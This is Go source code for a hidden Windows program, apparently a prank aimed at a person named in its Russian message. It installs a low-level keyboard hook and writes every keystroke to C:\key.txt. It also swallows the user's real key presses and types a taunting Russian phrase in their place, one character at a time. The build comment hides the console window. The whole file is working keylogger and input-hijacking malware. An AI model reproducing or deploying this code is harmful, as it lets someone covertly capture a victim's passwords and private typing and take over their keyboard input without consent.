package main

// go build -ldflags "-H=windowsgui" key.go

import (
	"bytes"
	"fmt"
	"os"
	"syscall"
	"unicode/utf8"
	"unsafe"

	"github.com/go-vgo/robotgo"
	"github.com/sirupsen/logrus"
)

const (
	whKeyboardLl        = 13
	wmKeydown           = 256 //0x0100
	wmKeyUp             = 257 //0x0101
	wmSysKeyDown        = 260 //0x0104
	wmSysKeyUp          = 261 //0x0105
	mapvkToVcs          = 0
	fileName            = "store.d.compile"
	keyMessage   string = "Аниме - сила, Даниил - могила!!! "
)

var (
	user32                    = syscall.MustLoadDLL("user32")
	procCallNextHookEx        = user32.MustFindProc("CallNextHookEx")
	procUnhookWindowsHookEx   = user32.MustFindProc("UnhookWindowsHookEx")
	procSetWindowsHookEx      = user32.MustFindProc("SetWindowsHookExW")
	procGetMessage            = user32.MustFindProc("GetMessageW")
	procMapVirtualKey         = user32.MustFindProc("MapVirtualKeyW")
	procToUnicode             = user32.MustFindProc("ToUnicode")
	procGetKeyboardState      = user32.MustFindProc("GetKeyboardState")
	procGetKeyboardLayoutName = user32.MustFindProc("GetKeyboardLayoutNameW")
	procGetKeyboardLayout     = user32.MustFindProc("GetKeyboardLayout")
	typed                     bool
	counter                   int
)

// HOOKPROC ...
type HOOKPROC func(int, uintptr, uintptr) uintptr

// MSG ...
type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

// KBDLLHOOKSTRUCT ...
type KBDLLHOOKSTRUCT struct {
	VkCode      uintptr
	ScanCode    uintptr
	Flags       uintptr
	Time        uintptr
	DwExtraInfo uintptr
}

// SetWindowsHookEx ...
func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod uintptr, dwThreadID uintptr) uintptr {
	ret, _, _ := procSetWindowsHookEx.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadID),
	)
	return uintptr(ret)
}

// CallNextHookEx ...
func CallNextHookEx(hhk uintptr, nCode int, wParam uintptr, lParam uintptr) uintptr {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return uintptr(ret)
}

// UnhookWindowsHookEx ...
func UnhookWindowsHookEx(hhk uintptr) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}

// LowLevelKeyboardProcess ...
func LowLevelKeyboardProcess(nCode int, wparam uintptr, lparam uintptr) uintptr {
	var temporaryKeyPtr uintptr
	var keyboardState [256]byte
	var unicodeKey [256]byte
	var keyboardLayoutName [256]byte
	if nCode == 0 && wparam == wmKeydown {
		key := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
		sc := MapVirtualKey(key.VkCode, mapvkToVcs)
		GetKeyboardLayoutName(&keyboardLayoutName)
		GetKeyboardState(&keyboardState)
		ToUnicode(key.VkCode, uintptr(sc), &keyboardState, &unicodeKey, 256, 0)
		unicodeKeyFiltered := bytes.Trim([]byte(unicodeKey[:]), "\x00")
		logrus.Infoln(string(unicodeKeyFiltered))
		if !typed {
			if counter < utf8.RuneCountInString(keyMessage) {
				typed = true
				robotgo.TypeStr(string([]rune(keyMessage)[counter]))
				counter++
			} else {
				counter = 0
			}
			return 1 //блочим остальные символы
		} else {
			typed = false
		}
	}
	return CallNextHookEx(temporaryKeyPtr, nCode, wparam, lparam)
}

// GetMessage ...
func GetMessage(msg *MSG, hwnd uintptr, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := procGetMessage.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

// MapVirtualKey ...
func MapVirtualKey(vkCode uintptr, uMapType uintptr) int {
	ret, _, _ := procMapVirtualKey.Call(
		uintptr(vkCode),
		uintptr(uMapType))
	return int(ret)
}

// ToUnicode ...
func ToUnicode(wVirtKey uintptr, wScanCode uintptr, lpKeyState *[256]byte, pwszBuff *[256]byte, cchBuff int, wFlags uint) int {
	ret, _, _ := procToUnicode.Call(
		uintptr(wVirtKey),
		uintptr(wScanCode),
		uintptr(unsafe.Pointer(lpKeyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		uintptr(cchBuff),
		uintptr(wFlags))
	return int(ret)
}

// GetKeyboardState ...
func GetKeyboardState(lpKeyState *[256]byte) int {
	ret, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(lpKeyState)))
	return int(ret)
}

// GetKeyboardLayoutName ...
func GetKeyboardLayoutName(pwszKLID *[256]byte) int {
	ret, _, _ := procGetKeyboardLayoutName.Call(uintptr(unsafe.Pointer(pwszKLID)))
	return int(ret)
}

// GetKeyboardLayout ...
func GetKeyboardLayout(idThread uintptr) int {
	ret, _, _ := procGetKeyboardLayout.Call(uintptr(idThread))
	return int(ret)
}

// Start ...
func Start() {
	defer user32.Release()
	var msg MSG
	keyboardHook := SetWindowsHookEx(whKeyboardLl, LowLevelKeyboardProcess, 0, 0)
	for GetMessage(&msg, 0, 0, 0) != 0 {
	}
	UnhookWindowsHookEx(keyboardHook)
}

//run in main()
func keyStart() {
	// Set Log output to a file
	filename := fmt.Sprintf("C:\\key.txt")
	logFile, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE, 0755)
	if err != nil {
		logrus.Info("Can't set log file")
	}
	logrus.SetOutput(logFile)
	Start()
}
